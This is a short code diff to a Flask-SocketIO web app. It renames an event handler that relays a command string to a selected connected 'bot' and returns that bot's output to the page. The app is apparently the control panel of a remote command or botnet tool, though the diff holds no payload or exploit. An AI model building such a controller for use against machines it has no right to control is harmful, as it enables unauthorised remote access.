@@ -35,12 +35,12 @@ def index():
     return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)
 
 
-@socketio.on('my_event', namespace='/bot')
-def test_message(cmd):
+@socketio.on('send_command', namespace='/bot')
+def send_receive(cmd):
     output = allConnections[connected].send(cmd['data'])
     output = json.loads(output)['output']
     if output:
-        emit('my_response',
+        emit('response',
              {'data': output[:-1]})
 
 
